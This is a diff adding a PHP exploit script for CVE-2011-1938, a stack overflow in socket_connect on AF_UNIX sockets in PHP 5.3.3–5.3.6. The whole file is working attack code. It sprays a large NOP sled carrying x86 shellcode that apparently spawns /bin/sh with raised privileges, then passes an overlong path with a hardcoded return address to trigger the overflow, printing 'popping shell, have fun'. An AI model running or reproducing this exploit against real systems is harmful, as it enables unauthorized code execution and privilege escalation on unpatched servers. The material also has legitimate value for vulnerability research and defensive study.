@@ -1,0 +1,25 @@
+<?php
+// Credit: Mateusz Kocielski, Marek Kroemeke and Filip Palian 
+// Affected Versions: 5.3.3-5.3.6 
+
+echo "[+] CVE-2011-1938";
+echo "[+] there we go...\n";
+define('EVIL_SPACE_ADDR', "\xff\xff\xee\xb3");
+define('EVIL_SPACE_SIZE', 1024*1024*8);
+$SHELLCODE = 
+        "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0".
+        "\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1".
+        "\xcd\x80";
+echo "[+] creating the sled.\n";
+
+$CODE = str_repeat("\x90", EVIL_SPACE_SIZE);
+for ($i = 0, $j = EVIL_SPACE_SIZE - strlen($SHELLCODE) - 1 ;
+        $i < strlen($SHELLCODE) ; $i++, $j++) {
+$CODE[$j] = $SHELLCODE[$i];
+}
+
+$b = str_repeat("A", 196).EVIL_SPACE_ADDR;
+$var79 = socket_create(AF_UNIX, SOCK_STREAM, 1);
+echo "[+] popping shell, have fun (if you picked the right address...)\n";
+$var85 = socket_connect($var79,$b);
+?>
